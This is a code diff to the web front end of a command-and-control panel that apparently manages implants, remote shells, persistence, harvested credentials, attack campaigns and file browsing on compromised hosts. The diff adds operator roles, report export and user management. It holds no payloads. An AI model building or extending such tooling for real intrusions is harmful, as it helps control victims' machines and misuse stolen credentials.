@@ -64,6 +64,8 @@ class App {
     const saved = sessionStorage.getItem('shardc2_token');
     if (saved) {
       this.api = new API(saved);
+      this.role = sessionStorage.getItem('shardc2_role') || 'viewer';
+      this.username = sessionStorage.getItem('shardc2_username') || '';
       this.showApp();
     }
   }
@@ -87,6 +89,10 @@ class App {
       if (!resp.ok || !data.token) throw new Error(data.error || 'login failed');
       this.api = new API(data.token);
       sessionStorage.setItem('shardc2_token', data.token);
+      sessionStorage.setItem('shardc2_role', data.role || 'viewer');
+      sessionStorage.setItem('shardc2_username', data.username || user);
+      this.role = data.role || 'viewer';
+      this.username = data.username || user;
       errorEl.textContent = '';
       this.showApp();
     } catch (e) {
@@ -95,8 +101,15 @@ class App {
     }
   }
 
+  canEdit() { return this.role === 'admin' || this.role === 'operator'; }
+  isAdmin() { return this.role === 'admin'; }
+
   logout() {
     sessionStorage.removeItem('shardc2_token');
+    sessionStorage.removeItem('shardc2_role');
+    sessionStorage.removeItem('shardc2_username');
+    this.role = null;
+    this.username = null;
     this.api = null;
     this.disconnectWS();
     clearInterval(this.refreshTimer);
@@ -110,6 +123,12 @@ class App {
   showApp() {
     document.getElementById('login-screen').style.display = 'none';
     document.getElementById('app').classList.remove('hidden');
+    const connEl = document.getElementById('conn-status');
+    if (connEl && this.username) {
+      connEl.innerHTML = `<span class="pulse-dot"></span><span>${this.username.toUpperCase()} [${this.role.toUpperCase()}]</span>`;
+    }
+    const settingsLink = document.querySelector('[data-page="settings"]');
+    if (settingsLink) settingsLink.style.display = this.isAdmin() ? '' : 'none';
     this.connectWS();
     this.loadSafetyBanner();
     this.navigate('dashboard');
@@ -175,10 +194,11 @@ class App {
   updateConnStatus(connected) {
     const el = document.getElementById('conn-status');
     if (!el) return;
+    const userTag = this.username ? `${this.username.toUpperCase()} [${(this.role||'').toUpperCase()}]` : '';
     if (connected) {
-      el.innerHTML = '<span class="pulse-dot"></span><span>WS LIVE</span>';
+      el.innerHTML = `<span class="pulse-dot"></span><span>${userTag || 'WS LIVE'}</span>`;
     } else {
-      el.innerHTML = '<span class="pulse-dot" style="background:var(--yellow);box-shadow:0 0 8px var(--yellow)"></span><span>POLLING</span>';
+      el.innerHTML = `<span class="pulse-dot" style="background:var(--yellow);box-shadow:0 0 8px var(--yellow)"></span><span>${userTag ? userTag + ' // POLLING' : 'POLLING'}</span>`;
     }
   }
 
@@ -222,6 +242,7 @@ class App {
       credentials: () => this.renderCredentials(),
       campaigns: () => this.renderCampaigns(),
       files: () => this.renderFileBrowser(),
+      settings: () => this.renderSettings(),
     };
 
     if (renders[page]) renders[page]();
@@ -328,8 +349,8 @@ class App {
           <td>${statusBadge(b)}</td>
           <td>${timeAgo(b.last_seen)}</td>
           <td>
-            <button class="btn-sm" onclick="app.openTerminalForBot('${b.id}')">SHELL</button>
-            <button class="btn-sm btn-danger" onclick="app.removeBot('${b.id}')">KILL</button>
+            ${this.canEdit() ? `<button class="btn-sm" onclick="app.openTerminalForBot('${b.id}')">SHELL</button>
+            <button class="btn-sm btn-danger" onclick="app.removeBot('${b.id}')">KILL</button>` : '<span style="color:var(--text-muted)">-</span>'}
           </td>
         </tr>`).join('')}</tbody></table></div>`;
 
@@ -412,7 +433,7 @@ class App {
 [*] Select a target implant to begin.
 [*] Command types: shell | download | upload | sleep | persist | kill
 [*] MULTI mode: send commands to multiple implants at once</span></div>
-        <div class="terminal-input-row">
+        ${this.canEdit() ? `<div class="terminal-input-row">
           <span class="terminal-prompt">root@shard:~#</span>
           <input type="text" id="term-input" placeholder="enter command..." onkeydown="app.handleTerminalKey(event)" autocomplete="off" spellcheck="false">
           <select class="cmd-type-select" id="term-cmd-type">
@@ -423,10 +444,11 @@ class App {
             <option value="persist">PERSIST</option>
             <option value="kill">KILL</option>
           </select>
-        </div>
+        </div>` : `<div style="padding:0.8rem 1rem;color:var(--yellow);font-size:0.75rem;letter-spacing:0.1em;border-top:1px solid var(--border)">VIEWER MODE — READ ONLY</div>`}
       </div>`;
 
-    document.getElementById('term-input').focus();
+    const termInput = document.getElementById('term-input');
+    if (termInput) termInput.focus();
     if (this.selectedBotId && !this.multiMode) this.loadHistory();
   }
 
@@ -693,11 +715,11 @@ class App {
           <td>${c.port}</td>
           <td><span class="os-tag">${esc(c.service).toUpperCase()}</span></td>
           <td style="color:var(--red-bright)">${esc(c.username)}</td>
-          <td style="color:var(--yellow)"><span class="masked-pw">${esc(c.password)}</span> <button class="btn-sm" onclick="app.revealCredential('${c.id}', this)">REVEAL</button></td>
+          <td style="color:var(--yellow)"><span class="masked-pw">${esc(c.password)}</span>${this.canEdit() ? ` <button class="btn-sm" onclick="app.revealCredential('${c.id}', this)">REVEAL</button>` : ''}</td>
           <td>${c.valid ? '<span class="badge badge-active">VALID</span>' : '<span class="badge badge-dead">INVALID</span>'}</td>
           <td>${c.bot_id ? c.bot_id.substring(0, 8) : '-'}</td>
           <td>${timeAgo(c.discovered_at)}</td>
-          <td><button class="btn-sm btn-danger" onclick="app.deleteCredential('${c.id}')">DELETE</button></td>
+          <td>${this.canEdit() ? `<button class="btn-sm btn-danger" onclick="app.deleteCredential('${c.id}')">DELETE</button>` : '<span style="color:var(--text-muted)">-</span>'}</td>
         </tr>`).join('')}</tbody></table></div>`;
   }
 
@@ -736,7 +758,7 @@ class App {
         <h1 class="page-title">CAMPAIGNS</h1>
         <span class="page-tag">OPERATIONS</span>
       </div>
-      <div class="camp-detail" id="camp-create-panel">
+      <div class="camp-detail" id="camp-create-panel" style="${this.canEdit() ? '' : 'display:none'}">
         <div style="margin-bottom:1rem;color:var(--text-muted);font-size:0.7rem;letter-spacing:0.1em">NEW OPERATION</div>
         <div class="config-grid">
           <div class="form-group">
@@ -978,11 +1000,13 @@ class App {
           <td>${progressHtml}</td>
           <td>${timeAgo(c.created_at)}</td>
           <td>
+            ${app.canEdit() ? `
             ${c.status === 'created' ? `<button class="btn-accent" style="padding:0.25rem 0.6rem;font-size:0.65rem" onclick="event.stopPropagation();app.launchCampaign('${c.id}')">LAUNCH</button>` : ''}
             ${c.status === 'running' ? `<button class="btn-sm" onclick="event.stopPropagation();app.pauseCampaign('${c.id}')">PAUSE</button>` : ''}
             ${c.status === 'paused' ? `<button class="btn-sm" onclick="event.stopPropagation();app.resumeCampaign('${c.id}')">RESUME</button>` : ''}
             ${c.status === 'completed' || c.status === 'failed' || c.status === 'paused' ? `<button class="btn-sm" style="color:var(--cyan)" onclick="event.stopPropagation();app.replayCampaign('${c.id}')">REPLAY</button>` : ''}
             <button class="btn-sm btn-danger" onclick="event.stopPropagation();app.deleteCampaign('${c.id}')">DELETE</button>
+            ` : '<span style="color:var(--text-muted)">-</span>'}
           </td>
         </tr>`;
       }).join('')}</tbody></table></div>`;
@@ -1015,10 +1039,12 @@ class App {
           <h1 class="page-title">${esc(camp.name)}</h1>
           <span class="page-tag">${esc(camp.type).toUpperCase()}</span>
           <div style="margin-left:auto;display:flex;gap:0.5rem">
+            ${this.canEdit() ? `
             ${camp.status === 'created' ? `<button class="btn-accent" onclick="app.launchCampaign('${id}')">LAUNCH</button>` : ''}
             ${camp.status === 'running' ? `<button class="btn-sm" onclick="app.pauseCampaign('${id}')">PAUSE</button>` : ''}
             ${camp.status === 'paused' ? `<button class="btn-accent" onclick="app.resumeCampaign('${id}')">RESUME</button>` : ''}
             ${camp.status === 'completed' || camp.status === 'failed' || camp.status === 'paused' ? `<button class="btn-accent" onclick="app.replayCampaign('${id}')">REPLAY</button>` : ''}
+            ` : ''}
             <button class="btn-sm" onclick="app.activeCampaignId=null;app.navigate('campaigns')">BACK</button>
           </div>
         </div>
@@ -1076,6 +1102,11 @@ class App {
           <button class="tab-btn ${this.campaignTab === 'overview' ? 'active' : ''}" onclick="app.campaignTab='overview';app.renderCampaignDetail('${id}')">Results (${tasks.length})</button>
           <button class="tab-btn ${this.campaignTab === 'bots' ? 'active' : ''}" onclick="app.campaignTab='bots';app.renderCampaignDetail('${id}')">Implants (${campBots.length})</button>
           <button class="tab-btn ${this.campaignTab === 'config' ? 'active' : ''}" onclick="app.campaignTab='config';app.renderCampaignDetail('${id}')">Config</button>
+        </div>
+        <div style="display:flex;gap:0.5rem;margin-top:0.5rem">
+          <button class="btn-sm" onclick="app.exportCampaign('${id}','json')">EXPORT JSON</button>
+          <button class="btn-sm" onclick="app.exportCampaign('${id}','html')">EXPORT HTML</button>
+          <button class="btn-sm" onclick="app.exportCampaign('${id}','md')">EXPORT MD</button>
         </div>
         <div id="camp-tab-content"></div>`;
 
@@ -1191,6 +1222,120 @@ class App {
     this.activeCampaignId = result.id;
     clearInterval(this.refreshTimer);
     await this.renderCampaignDetail(result.id);
+  }
+
+  async exportCampaign(id, format) {
+    try {
+      const response = await fetch(`/api/v1/campaigns/${id}/report.${format}`, {
+        headers: { 'Authorization': `Bearer ${sessionStorage.getItem('shardc2_token')}` }
+      });
+      if (!response.ok) throw new Error(`Export failed: ${response.statusText}`);
+      const blob = await response.blob();
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = `campaign-${id.substring(0, 8)}-report.${format}`;
+      a.click();
+      URL.revokeObjectURL(a.href);
+    } catch (e) {
+      alert('Export failed: ' + e.message);
+    }
+  }
+
+  // ===== SETTINGS / OPERATORS =====
+  async renderSettings() {
+    if (!this.isAdmin()) {
+      this.navigate('dashboard');
+      return;
+    }
+    const c = document.getElementById('content');
+    c.innerHTML = `
+      <div class="page-header">
+        <h1 class="page-title">SETTINGS</h1>
+        <span class="page-tag">USER MANAGEMENT</span>
+      </div>
+      <div class="camp-detail" id="operator-create-panel">
+        <div style="margin-bottom:1rem;color:var(--text-muted);font-size:0.7rem;letter-spacing:0.1em">CREATE OPERATOR</div>
+        <div class="config-grid">
+          <div class="form-group">
+            <label>Username</label>
+            <input type="text" id="op-username" placeholder="username">
+          </div>
+          <div class="form-group">
+            <label>Password</label>
+            <input type="password" id="op-password" placeholder="password">
+          </div>
+          <div class="form-group">
+            <label>Role</label>
+            <select id="op-role">
+              <option value="admin">ADMIN</option>
+              <option value="operator" selected>OPERATOR</option>
+              <option value="viewer">VIEWER</option>
+            </select>
+          </div>
+        </div>
+        <div style="margin-top:0.8rem">
+          <button class="btn-accent" onclick="app.createOperator()">CREATE OPERATOR</button>
+        </div>
+      </div>
+      <div class="section-header">
+        <span class="section-title">OPERATORS</span>
+      </div>
+      <div id="operators-table"></div>`;
+    await this.refreshOperators();
+  }
+
+  async refreshOperators() {
+    try {
+      const data = await this.api.get('/operators');
+      const ops = data.operators || data || [];
+      const el = document.getElementById('operators-table');
+      if (!el) return;
+
+      if (ops.length === 0) {
+        el.innerHTML = '<div class="empty-state"><div class="icon">&#9881;</div><p>NO OPERATORS</p></div>';
+        return;
+      }
+
+      el.innerHTML = `<div class="table-wrap"><table>
+        <thead><tr><th>Username</th><th>Role</th><th>Active</th><th>Last Login</th><th>Created</th><th>Actions</th></tr></thead>
+        <tbody>${(Array.isArray(ops) ? ops : []).map(o => `
+          <tr>
+            <td style="color:var(--text-bright)">${esc(o.username)}</td>
+            <td><span class="os-tag">${esc(o.role || '').toUpperCase()}</span></td>
+            <td>${o.active !== false ? '<span class="badge badge-active">YES</span>' : '<span class="badge badge-dead">NO</span>'}</td>
+            <td>${o.last_login ? timeAgo(o.last_login) : '-'}</td>
+            <td>${o.created_at ? timeAgo(o.created_at) : '-'}</td>
+            <td><button class="btn-sm btn-danger" onclick="app.deleteOperator('${o.id}')">DELETE</button></td>
+          </tr>`).join('')}</tbody></table></div>`;
+    } catch (e) {
+      const el = document.getElementById('operators-table');
+      if (el) el.innerHTML = `<div class="empty-state"><p>Failed to load operators: ${esc(e.message)}</p></div>`;
+    }
+  }
+
+  async createOperator() {
+    const username = document.getElementById('op-username').value.trim();
+    const password = document.getElementById('op-password').value.trim();
+    const role = document.getElementById('op-role').value;
+    if (!username || !password) { alert('Username and password required'); return; }
+    try {
+      await this.api.post('/operators', { username, password, role });
+      document.getElementById('op-username').value = '';
+      document.getElementById('op-password').value = '';
+      await this.refreshOperators();
+    } catch (e) {
+      alert('Failed to create operator: ' + e.message);
+    }
+  }
+
+  async deleteOperator(id) {
+    if (!confirm('Delete this operator?')) return;
+    try {
+      await this.api.del(`/operators/${id}`);
+      await this.refreshOperators();
+    } catch (e) {
+      alert('Failed to delete operator: ' + e.message);
+    }
   }
 
   // ===== FILE BROWSER =====
@@ -1322,7 +1467,7 @@ class App {
             <td style="font-size:0.72rem">${esc(f.owner)}</td>
             <td style="font-size:0.72rem">${formatSize(f.size)}</td>
             <td style="font-size:0.72rem;color:var(--text-muted)">${f.date} ${f.time}</td>
-            <td>${!f.isDir ? `<button class="btn-sm" onclick="event.stopPropagation();app.downloadFile('${esc(fullPath)}')">GET</button>` : ''}</td>
+            <td>${!f.isDir && app.canEdit() ? `<button class="btn-sm" onclick="event.stopPropagation();app.downloadFile('${esc(fullPath)}')">GET</button>` : ''}</td>
           </tr>`;
         }).join('')}
       </tbody></table></div>`;
